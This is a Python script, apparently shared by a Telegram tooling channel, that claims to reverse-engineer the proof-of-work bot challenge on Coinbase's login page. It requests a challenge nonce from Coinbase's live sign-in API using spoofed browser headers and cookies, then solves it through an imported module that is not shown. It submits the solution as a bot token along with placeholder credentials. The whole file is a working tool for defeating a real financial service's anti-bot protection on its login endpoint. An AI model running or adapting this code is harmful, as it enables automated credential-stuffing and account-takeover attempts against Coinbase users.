"""
    Coinbase's proof of work (PoW) algorithm can be found around line 150 in
    https://login.coinbase.com/e_C1Tp-yCr.js
    
    In this project, I fully reversed their implementation of it :)
    
    Disclaimer: I am not responsible for any damage that may be caused by
    using this code. Use at your own risk. 
    
    This code was written by @fuckingtermed
    t.me/CanadianToolsV3
"""

import documentation as d
import requests
import uuid
import json


def get_nonce():
    # let's get an original nonce!
    print("Getting a nonce...")
    guid1 = str(uuid.uuid4())
    guid2 = str(uuid.uuid4())
    user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1'
    base_64_user_agent = 'TW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxN181XzEgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjUgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjE='
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "affiliate": base_64_user_agent,
        "cache-control": "no-cache",
        "content-type": "application/json",
        "cookie": f'cb_dm={guid2}; df2=8790945a62595930975d10f7aa45e31a; advertising_sharing_allowed={{"value":true}}; df3="d1ff8ebfb6a84ee09f10d08dde2b7411";',
        "flow-id": "signin",
        "locale": "en",
        "origin": "https://login.coinbase.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://login.coinbase.com/",
        "sardine-session-id": guid2,
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": user_agent,
        "x-cb-device-id": guid1,
        "x-cb-is-logged-in": "false",
        "x-cb-pagekey": "signin",
        "x-cb-platform": "web",
        "x-cb-project-name": "unified_login",
        "x-cb-session-uuid": guid2,
        "x-cb-ujs": "ujs_submit_login_credentials",
        "x-cb-user-id": "unknown",
        "x-cb-version-name": "4b93496cb537e8774fc4d1fc49e2c111ceb9be91"
    }
    # leave bot_token empty
    payload = {
    "password": {
        "email": 'email@example.com',
        "password": 'Password123!'
    },
    "constraints": {
        "mode": "ALLOW",
        "types": ["PASSWORD", "WALLET", "PASSKEY", "OAUTH_GOOGLE", "OAUTH_APPLE"],
        "clientConstraints": ""
    },
    "action": "web-UnifiedLogin-IdentificationPrompt",
    "bot_token": ''
    }
    
    r = requests.post("https://login.coinbase.com/api/two-factor/v1/verify/PASSWORD", json=payload, headers=headers)
    # print('Response: ' + r.text)
    resp = json.loads(r.text)
    nonce = resp["details"][0]["nonce"]
    return nonce

def send_solution(solution):
    # let's get an original nonce!
    
    print("Sending the solution...")
    guid1 = str(uuid.uuid4())
    guid2 = str(uuid.uuid4())
    user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1'
    token = 'dGhpc193YXNfbWFkZV9ieV9AZnVja2luZ3Rlcm1lZF9vbl90ZWxlZ3JhbV9pZl95b3Vfc2VlX3RoaXNfbWVzc2FnZV93aXRoX3NvbWVvbmVfZWxzZXNfdXNlcm5hbWVfaXRfd2FzX3NraWRkZWQ='
    base_64_user_agent = 'TW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxN181XzEgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjUgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjE='
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "affiliate": base_64_user_agent,
        "cache-control": "no-cache",
        "content-type": "application/json",
        "cookie": f'cb_dm={guid2}; df2=8790945a62595930975d10f7aa45e31a; advertising_sharing_allowed={{"value":true}}; df3="d1ff8ebfb6a84ee09f10d08dde2b7411";',
        "flow-id": "signin",
        "locale": "en",
        "origin": "https://login.coinbase.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://login.coinbase.com/",
        "sardine-session-id": guid2,
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": user_agent,
        "x-cb-device-id": guid1,
        "x-cb-is-logged-in": "false",
        "x-cb-pagekey": "signin",
        "x-cb-platform": "web",
        "x-cb-project-name": "unified_login",
        "x-cb-session-uuid": guid2,
        "x-cb-ujs": "ujs_submit_login_credentials",
        "x-cb-user-id": "unknown",
        "x-cb-version-name": "4b93496cb537e8774fc4d1fc49e2c111ceb9be91",
        "x-cb-token": token
    }
    # leave bot_token empty
    payload = {
    "password": {
        "email": 'email@fuckingtermed.com',
        "password": 'Password123!'
    },
    "constraints": {
        "mode": "ALLOW",
        "types": ["PASSWORD", "WALLET", "PASSKEY", "OAUTH_GOOGLE", "OAUTH_APPLE"],
        "clientConstraints": ""
    },
    "action": "web-UnifiedLogin-IdentificationPrompt",
    "bot_token": solution
    }
    
    r = requests.post("https://login.coinbase.com/api/two-factor/v1/verify/PASSWORD", json=payload, headers=headers)
    if "INVALID_TOKEN" in r.text:
        print("We did it!")
    else:
        print("Failed :(")

def main():
    nonce = get_nonce()
    suffix = d.generate_suffix(nonce)
    solution = d.solution(nonce, suffix)
    send_solution(solution)
    print("Suffix: " + suffix)
    print("Solution: " + solution)
    print("Nonce: " + nonce)
    print("Done!")

main()
